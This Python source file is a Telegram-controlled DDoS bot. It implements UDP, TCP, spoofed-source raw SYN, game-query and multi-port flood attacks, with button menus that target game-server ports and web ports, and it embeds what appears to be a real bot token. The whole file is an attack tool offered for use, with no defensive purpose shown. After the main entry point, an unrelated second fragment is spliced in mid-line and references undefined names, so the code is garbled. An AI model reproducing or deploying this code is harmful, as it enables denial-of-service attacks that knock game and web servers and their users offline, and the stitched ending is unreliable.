import socket
import threading
import time
import random
import struct
import os
import sys
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

BOT_TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
ADMIN_ID = 8210011971

attack_running = False
attack_stats = {'packets': 0, 'bytes': 0}
attack_lock = threading.Lock()

# ============================================
#         ATTACK METHODS - FULL POWER
# ============================================

def udp_flood(ip, port, duration):
    """Heavy UDP flood - multiple sockets, max payload"""
    global attack_running, attack_stats
    timeout = time.time() + int(duration)
    port = int(port)

    # Multiple sockets for speed
    sockets = []
    for _ in range(10):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        sockets.append(s)

    # Different payload sizes for variation
    payloads = [
        random._urandom(65000),   # Max UDP payload
        random._urandom(32000),
        random._urandom(1024),
        b'\xff' * 65000,          # All 0xFF bytes
        b'\x00' * 65000,          # Null flood
    ]

    while time.time() < timeout and attack_running:
        for s in sockets:
            try:
                payload = random.choice(payloads)
                s.sendto(payload, (ip, port))
                with attack_lock:
                    attack_stats['packets'] += 1
                    attack_stats['bytes'] += len(payload)
            except:
                pass

    for s in sockets:
        try:
            s.close()
        except:
            pass


def tcp_flood(ip, port, duration):
    """TCP connection flood - mass SYN connections"""
    global attack_running, attack_stats
    timeout = time.time() + int(duration)
    port = int(port)

    while time.time() < timeout and attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.connect_ex((ip, port))
            # Send garbage data
            s.send(random._urandom(2048))
            with attack_lock:
                attack_stats['packets'] += 1
                attack_stats['bytes'] += 2048
            s.close()
        except:
            pass


def syn_flood_raw(ip, port, duration):
    """Raw socket SYN flood - requires root/admin"""
    global attack_running, attack_stats
    timeout = time.time() + int(duration)
    port = int(port)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("⚠️ Raw socket need ROOT/SUDO access!")
        # Fallback to TCP flood
        tcp_flood(ip, port, duration)
        return

    def checksum(data):
        if len(data) % 2:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    dest_ip = socket.inet_aton(ip)

    while time.time() < timeout and attack_running:
        try:
            src_ip = socket.inet_aton(f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}")
            src_port = random.randint(1024, 65535)

            # IP Header
            ip_header = struct.pack('!BBHHHBBH4s4s',
                0x45, 0, 40,
                random.randint(1, 65535), 0,
                64, socket.IPPROTO_TCP, 0,
                src_ip, dest_ip
            )

            # TCP Header with SYN flag
            seq = random.randint(0, 0xFFFFFFFF)
            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, port,
                seq, 0,
                0x50, 0x02,  # SYN flag
                65535, 0, 0
            )

            # Pseudo header for checksum
            pseudo = struct.pack('!4s4sBBH', src_ip, dest_ip, 0, socket.IPPROTO_TCP, len(tcp_header))
            tcp_check = checksum(pseudo + tcp_header)
            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, port,
                seq, 0,
                0x50, 0x02,
                65535, tcp_check, 0
            )

            packet = ip_header + tcp_header
            s.sendto(packet, (ip, port))

            with attack_lock:
                attack_stats['packets'] += 1
                attack_stats['bytes'] += len(packet)
        except:
            pass

    s.close()


def game_query_flood(ip, port, duration):
    """Game protocol specific packets - Source/Valve/Minecraft"""
    global attack_running, attack_stats
    timeout = time.time() + int(duration)
    port = int(port)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Game-specific query packets
    game_payloads = [
        # Source Engine Query
        b'\xff\xff\xff\xff\x54Source Engine Query\x00',
        # Valve Server query
        b'\xff\xff\xff\xff\x55\xff\xff\xff\xff',
        # Minecraft handshake
        b'\xfe\x01\xfa\x00\x06\x00\x6d\x00\x69\x00\x6e\x00\x65',
        # Generic game ping
        b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        # SAMP query
        b'SAMP' + b'\x00' * 20,
        # MTA query
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        # Large random game packet
        random._urandom(4096),
        random._urandom(8192),
    ]

    while time.time() < timeout and attack_running:
        for payload in game_payloads:
            try:
                sock.sendto(payload, (ip, port))
                with attack_lock:
                    attack_stats['packets'] += 1
                    attack_stats['bytes'] += len(payload)
            except:
                pass

    sock.close()


def multi_port_flood(ip, port, duration):
    """Attack on multiple common game ports simultaneously"""
    global attack_running, attack_stats
    timeout = time.time() + int(duration)

    game_ports = [int(port), 7777, 7778, 7789, 7889, 8080, 8888, 9999,
                  17500, 17000, 17010, 25565, 27015, 27016, 30120, 30110]

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(65000)

    while time.time() < timeout and attack_running:
        for p in game_ports:
            try:
                sock.sendto(payload, (ip, p))
                with attack_lock:
                    attack_stats['packets'] += 1
                    attack_stats['bytes'] += len(payload)
            except:
                pass

    sock.close()


# ============================================
#        MULTI-VECTOR ATTACK LAUNCHER
# ============================================

def launch_attack(ip, port, duration, threads, method, update_func=None):
    global attack_running, attack_stats, attack_threads_list
    attack_running = True
    attack_stats = {'packets': 0, 'bytes': 0}
    attack_threads_list = []

    methods = {
        'udp': udp_flood,
        'tcp': tcp_flood,
        'syn': syn_flood_raw,
        'game': game_query_flood,
        'multiport': multi_port_flood,
        'mixed': None  # Special - all methods combined
    }

    thread_count = int(threads)

    if method == 'mixed':
        # Divide threads across all methods
        all_methods = [udp_flood, tcp_flood, syn_flood_raw, game_query_flood, multi_port_flood]
        per_method = max(1, thread_count // len(all_methods))

        for attack_func in all_methods:
            for _ in range(per_method):
                t = threading.Thread(target=attack_func, args=(ip, port, duration), daemon=True)
                t.start()
                attack_threads_list.append(t)
    else:
        attack_func = methods.get(method, udp_flood)
        for _ in range(thread_count):
            t = threading.Thread(target=attack_func, args=(ip, port, duration), daemon=True)
            t.start()
            attack_threads_list.append(t)

    # Stats monitor thread
    if update_func:
        monitor = threading.Thread(target=stats_monitor, args=(ip, port, duration, update_func), daemon=True)
        monitor.start()


def stats_monitor(ip, port, duration, update_func):
    global attack_running, attack_stats
    start_time = time.time()
    dur = int(duration)

    while attack_running and (time.time() - start_time) < dur:
        time.sleep(5)
        elapsed = int(time.time() - start_time)
        remaining = dur - elapsed
        pkts = attack_stats['packets']
        mb = attack_stats['bytes'] / (1024 * 1024)
        pps = pkts / max(elapsed, 1)

        try:
            update_func(
                f"⚡ *ATTACK LIVE*\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"📦 Packets: `{pkts:,}`\n"
                f"📊 Data Sent: `{mb:,.1f} MB`\n"
                f"🚀 Speed: `{pps:,.0f} pkt/s`\n"
                f"⏱ Remaining: `{remaining}s`\n"
                f"━━━━━━━━━━━━━━━"
            )
        except:
            pass

    attack_running = False
    pkts = attack_stats['packets']
    mb = attack_stats['bytes'] / (1024 * 1024)

    try:
        update_func(
            f"✅ *ATTACK COMPLETE*\n\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"📦 Total Packets: `{pkts:,}`\n"
            f"📊 Total Data: `{mb:,.1f} MB`\n"
            f"⏱ Duration: `{duration}s`\n"
            f"━━━━━━━━━━━━━━━"
        )
    except:
        pass


# ============================================
#           TELEGRAM BOT HANDLERS
# ============================================

def start(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id != ADMIN_ID:
        update.message.reply_text("❌ Access Denied.")
        return

    keyboard = [
        [InlineKeyboardButton("🚀 Attack", callback_data="menu_attack")],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data="menu_stop")],
        [InlineKeyboardButton("📖 Help", callback_data="menu_help")],
    ]
    update.message.reply_text(
        "⚡ *DDoS Attack Bot* ⚡\n\nSelect option:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


def show_help(query):
    query.edit_message_text(
        "📖 *Attack Methods:*\n\n"
        "🔵 *UDP Flood* - Heavy data flood, best for game servers\n"
        "🔴 *TCP Flood* - Connection exhaustion\n"
        "🟡 *SYN Flood* - Raw packet SYN (needs root)\n"
        "🟢 *Game Query* - Game protocol specific\n"
        "🟣 *Multi-Port* - Hit multiple ports at once\n"
        "⚫ *MIXED (Best)* - All methods combined!\n\n"
        "⚠️ *Tips:*\n"
        "• `Mixed` method sabse effective hai\n"
        "• 500+ threads use karo\n"
        "• Root/sudo se run karo for SYN flood\n"
        "• VPS se run karo (high bandwidth)\n",
        parse_mode="Markdown"
    )


def ask_ip(query, context):
    context.user_data['step'] = 'waiting_ip'
    query.edit_message_text("🎯 *Target IP bhejo:*\n\nExample: `1.2.3.4`", parse_mode="Markdown")


def show_port_buttons(chat_func, ip):
    keyboard = [
        [InlineKeyboardButton("17500 (FF/BGMI)", callback_data="port_17500"),
         InlineKeyboardButton("7889 (PUBG)", callback_data="port_7889")],
        [InlineKeyboardButton("25565 (MC)", callback_data="port_25565"),
         InlineKeyboardButton("30120 (FiveM)", callback_data="port_30120")],
        [InlineKeyboardButton("80 (HTTP)", callback_data="port_80"),
         InlineKeyboardButton("443 (HTTPS)", callback_data="port_443")],
        [InlineKeyboardButton("✏️ Custom Port", callback_data="port_custom")],
    ]
    chat_func(
        f"✅ IP: `{ip}`\n\n🔌 *Port select karo:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


def show_method_buttons(query, context):
    keyboard = [
        [InlineKeyboardButton("🔵 UDP Flood", callback_data="method_udp"),
         InlineKeyboardButton("🔴 TCP Flood", callback_data="method_tcp")],
        [InlineKeyboardButton("🟡 SYN Flood", callback_data="method_syn"),
         InlineKeyboardButton("🟢 Game Query", callback_data="method_game")],
        [InlineKeyboardButton("🟣 Multi-Port", callback_data="method_multiport")],
        [InlineKeyboardButton("⚫ MIXED (BEST)", callback_data="method_mixed")],
    ]
    port = context.user_data.get('port', '?')
    query.edit_message_text(
        f"✅ Port: `{port}`\n\n💣 *Attack Method select karo:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


def show_thread_buttons(query, context):
    keyboard = [
        [InlineKeyboardButton("100", callback_data="thread_100"),
         InlineKeyboardButton("200", callback_data="thread_200"),
         InlineKeyboardButton("500", callback_data="thread_500")],
        [InlineKeyboardButton("1000", callback_data="thread_1000"),
         InlineKeyboardButton("2000", callback_data="thread_2000")],
    ]
    method = context.user_data.get('method', '?')
    query.edit_message_text(
        f"✅ Method: `{method}`\n\n🧵 *Threads select karo:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


def show_time_buttons(query, context):
    keyboard = [
        [InlineKeyboardButton("30s", callback_data="time_30"),
         InlineKeyboardButton("60s", callback_data="time_60"),
         InlineKeyboardButton("120s", callback_data="time_120")],
        [InlineKeyboardButton("180s", callback_data="time_180"),
         InlineKeyboardButton("300s", callback_data="time_300"),
         InlineKeyboardButton("600s", callback_data="time_600")],
    ]
    threads = context.user_data.get('threads', '?')
    query.edit_message_text(
        f"✅ Threads: `{threads}`\n\n⏱ *Duration select karo:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


def show_confirm(query, context):
    ip = context.user_data.get('ip', '?')
    port = context.user_data.get('port', '?')
    method = context.user_data.get('method', '?')
    threads = context.user_data.get('threads', '?')
    duration = context.user_data.get('duration', '?')

    keyboard = [
        [InlineKeyboardButton("✅ LAUNCH ATTACK", callback_data="confirm_yes")],
        [InlineKeyboardButton("❌ Cancel", callback_data="confirm_no")],
    ]
    query.edit_message_text(
        f"⚡ *ATTACK SUMMARY*\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🎯 IP: `{ip}`\n"
        f"🔌 Port: `{port}`\n"
        f"💣 Method: `{method}`\n"
        f"🧵 Threads: `{threads}`\n"
        f"⏱ Duration: `{duration}s`\n"
        f"━━━━━━━━━━━━━━━\n\n"
        f"*Confirm karo:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


def execute_attack(query, context):
    global attack_running

    if attack_running:
        query.edit_message_text("⚠️ Ek attack already chal raha hai! Pehle stop karo.")
        return

    ip = context.user_data.get('ip')
    port = context.user_data.get('port')
    method = context.user_data.get('method', 'mixed')
    threads = context.user_data.get('threads', '200')
    duration = context.user_data.get('duration', '60')

    msg = query.edit_message_text(
        f"🚀 *ATTACK LAUNCHING...*\n\n"
        f"🎯 `{ip}:{port}`\n"
        f"💣 Method: `{method}`\n"
        f"🧵 Threads: `{threads}`\n"
        f"⏱ Duration: `{duration}s`\n\n"
        f"⏳ Starting...",
        parse_mode="Markdown"
    )

    def update_msg(text):
        try:
            msg.edit_text(text, parse_mode="Markdown")
        except:
            pass

    # Launch in background
    t = threading.Thread(
        target=launch_attack,
        args=(ip, port, duration, threads, method, update_msg),
        daemon=True
    )
    t.start()


def stop_attack(query):
    global attack_running
    attack_running = False
    query.edit_message_text("🛑 *Attack Stopped!*", parse_mode="Markdown")


# ============================================
#         MAIN CALLBACK HANDLER
# ============================================

def button_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id

    if user_id != ADMIN_ID:
        query.answer("❌ Access Denied!", show_alert=True)
        return

    query.answer()
    data = query.data

    # Menu
    if data == "menu_attack":
        ask_ip(query, context)
    elif data == "menu_stop":
        stop_attack(query)
    elif data == "menu_help":
        show_help(query)

    # Port
    elif data.startswith("port_"):
        if data == "port_custom":
            context.user_data['step'] = 'waiting_port'
            query.edit_message_text("✏️ *Custom port bhejo:*", parse_mode="Markdown")
        else:
            context.user_data['port'] = data.split("_", 1)[1]
            show_method_buttons(query, context)

    # Method
    elif data.startswith("method_"):
        context.user_data['method'] = data.split("_", 1)[1]
        show_thread_buttons(query, context)

    # Threads
    elif data.startswith("thread_"):
        context.user_data['threads'] = data.split("_", 1)[1]
        show_time_buttons(query, context)

    # Time
    elif data.startswith("time_"):
        context.user_data['duration'] = data.split("_", 1)[1]
        show_confirm(query, context)

    # Confirm
    elif data == "confirm_yes":
        execute_attack(query, context)
    elif data == "confirm_no":
        query.edit_message_text("❌ Cancelled.")


# ============================================
#          TEXT MESSAGE HANDLER
# ============================================

def handle_text(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id != ADMIN_ID:
        return

    step = context.user_data.get('step')

    if step == 'waiting_ip':
        ip = update.message.text.strip()
        context.user_data['ip'] = ip
        context.user_data['step'] = None
        show_port_buttons(update.message.reply_text, ip)

    elif step == 'waiting_port':
        port = update.message.text.strip()
        context.user_data['port'] = port
        context.user_data['step'] = None
        keyboard = [
            [InlineKeyboardButton("🔵 UDP", callback_data="method_udp"),
             InlineKeyboardButton("🔴 TCP", callback_data="method_tcp")],
            [InlineKeyboardButton("🟡 SYN", callback_data="method_syn"),
             InlineKeyboardButton("🟢 Game", callback_data="method_game")],
            [InlineKeyboardButton("🟣 Multi-Port", callback_data="method_multiport")],
            [InlineKeyboardButton("⚫ MIXED", callback_data="method_mixed")],
        ]
        update.message.reply_text(
            f"✅ Port: `{port}`\n\n💣 *Method select karo:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )


# ============================================
#                  MAIN
# ============================================

def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(button_callback))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text))

    print("✅ Bot Started! Run with sudo for SYN flood support.")
    updater.start_polling()
    updater.idle()


if __name__ == "__main__":
    main()    if not d:
        return
    threads = int(q.data)
    q.edit_message_text(f"🔥 Attack on {d['ip']}:{d['port']} | {threads} thr | {d['time']}s")
    threading.Thread(target=start_attack, args=(d['ip'], d['port'], threads, d['time'])).start()

def stop(update, context):
    global attack_active
    attack_active = False
    update.message.reply_text("🛑 Stopped")

def main():
    u = Updater(TOKEN, use_context=True)
    u.dispatcher.add_handler(CommandHandler("start", start))
    u.dispatcher.add_handler(CommandHandler("stop", stop))
    u.dispatcher.add_handler(CallbackQueryHandler(button))
    u.dispatcher.add_handler(MessageHandler(Filters.text, handle))
    print("Bot Running...")
    u.start_polling()
    u.idle()

if __name__ == "__main__":
    main()
